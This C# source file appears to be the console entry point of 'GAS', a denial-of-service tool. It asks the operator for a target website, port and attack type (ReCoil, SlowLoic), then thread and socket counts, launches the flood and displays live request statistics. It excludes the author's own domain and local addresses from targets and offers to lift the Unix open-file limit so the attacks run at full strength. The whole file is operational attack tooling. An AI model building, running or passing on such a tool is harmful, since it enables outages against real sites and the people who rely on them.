using System;
using System.Linq;
using System.Timers;
//using GAS.Core;
//using GAS.Core.AttackInformation;
using GAS.Core;
using GAS.Core.AttackInformation;
using kasthack.Tools;

namespace GAS.TUI {
    public static class Program {
        static DateTime _d;
        static readonly string[] Blacklist = { "epicm.org", "localhost", "127.0.0", "192.168." };
        static readonly Manager Core = new Manager();
        static int _num = 1;
        public static void Main() {
            bool tmpBoolParse;
            const int cv = 47;
            var sharps = new string('#', cv);
            var dashes = new string('-', cv);
            try { Console.Title = @"[GAS] for urkaine :)"; }
            catch ( Exception ) { }
            string temp;
            if ( Environment.OSVersion.Platform.ToString().ToLower().Contains( "unix" ) )
                UnixUlimitPrompt();
            ConTools.WriteMessage( String.Join(Environment.NewLine, sharps, @"# GAS by http://github.com/kasthack #", sharps ) );
            while( !GetHost() ) { }
            #region GetParam
            if (bool.Parse(
                ConTools.ReadLine(
                    String.Format(
                        "Subsite is {0}, do you want to change it? (true/false)",
                        Core.Subsite),
                    false)
                )
            )
            Core.Subsite = ConTools.ReadLine("Enter subsite", "/");
            Core.Port = ConTools.ReadInt("Enter port", 80);
            var mt = typeof( AttackMethod );
            Core.Method = (AttackMethod) Enum.Parse(
                    mt,
                    ConTools.ReadLine( 
                        String.Format(
                            "Select attack type ({0})",
                            String.Join(
                                "|",
                                Enum.GetNames( mt )
                            )
                        ),
                        AttackMethod.ReCoil
                    )
                );
            Core.Threads = ConTools.ReadInt("Enter thread count", Environment.ProcessorCount);
            Core.Spt = ConTools.ReadInt("Enter sockets per thread", 50);
            Core.Delay = ConTools.ReadInt("Enter delay", 0);
            Core.Timeout = ConTools.ReadInt("Enter timeout", 30);
            while ( !bool.TryParse( ( temp = _q( "USE Get [true]:" ) ) == "" ? "true" : temp, out tmpBoolParse ) )
            Core.UseGet = tmpBoolParse;
            Core.UseGZIP = bool.Parse(ConTools.ReadLine("USE GZIP", true));
            Core.WaitForResponse = bool.Parse(ConTools.ReadLine("Wait For Response", false));
            Core.AppendRandomChars = bool.Parse(ConTools.ReadLine("Append RANDOM Chars", true));
            Core.AppendRandomCharsUrl = bool.Parse(ConTools.ReadLine("Append RANDOM Chars To Url", true));
            Console.WriteLine( @"Starting attack..." );
            Core.Start();
            _d = DateTime.Now;
            Console.Clear();
            var t = new Timer { Interval = 500 };
            t.Elapsed += t_Elapsed;
            t.Start();
            #region Cool UI
            Console.SetCursorPosition( 0, 0 );
            ConTools.WriteMessage(dashes);
            try {
                Console.SetCursorPosition( 0, 6 );
            }
            catch { }
            ConTools.WriteMessage(dashes);
            ConTools.WriteMessage( @"Attacking..." );
            _e(@"Press Enter stop attack and exit" );
            Console.ForegroundColor = ConsoleColor.Green;
            #endregion
            Console.ReadLine();
            ConTools.WriteMessage( dashes+"\r\nExiting, please wait..." );
            t.Stop();
            Core.Stop();
            Console.Clear();
            #endregion
        }

        private static void UnixUlimitPrompt() {
            if ( Environment.UserName != "root" )
                Console.Error.WriteLine( @"You are using Linux/Mac OS and you are not root." +
                                            "If you want to use ReCoil/SlowLoic attack you must" +
                                            " runs \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\"" );
            else {
                Console.WriteLine(  @"Is file open limit unlocked? If attack willnot give any effect runs"+
                                        @"""ulimit -n<ShreadCount>*<SocketCount>*2+5000"" as root" );
                if ( !bool.Parse( ConTools.ReadLine( @"Do you want to runs ""ulimit -n999999""? (true|false)", true ) ) )return;
                try { System.Diagnostics.Process.Start( "ulimit", "-n999999" ); }
                catch { ConTools.WriteError( "Failed to runs ulimit" ); }
            }
        }
        static string _q( string q ) { return ConTools.ReadLine(q);}
        static void _e( string e ) { ConTools.WriteError(e); }
        static bool GetHost() {
            var temp = _q( "Select target [www.example.com]" );
            temp = ( temp == "" ? "www.example.com" : temp );
            if ( Blacklist.Any( s => temp.ToLower().Contains( s ) ) ) {
                _e( "[Restricted domain!]" );
                return false;
            }
            var ipok = Core.LockOn( temp );
            if ( !ipok )
                _e( "[Wrong Target!]" );
            return ipok;
        }
        static void t_Elapsed( object sender, ElapsedEventArgs argZ ) {
            var w = Console.WindowWidth;
            var e = new char[ w ];
            int ind;
            for ( var i = 0; i < w; e[ i++ ] = ' ' ) { }
            try {
                Console.SetCursorPosition( 0, 3 );
            }
            catch ( Exception ) { }
            Console.WriteLine( e );
            Console.WriteLine( e );
            try {
                Console.SetCursorPosition( 0, 3 );
            }
            catch { }
            Console.WriteLine( @"Time elapsed	Sent	Received	Failed" );
            var s = DateTime.Now.Subtract( _d ).ToString();
            s = s.Substring( 0, ( ind = s.LastIndexOfAny( new[] { '.', ',' } ) ) > 0 ? ind : s.Length );
            Console.WriteLine( @"{0}	{1}	{2}		{3}", s, Core.Requested, Core.Downloaded, Core.Failed );
        }
    }
}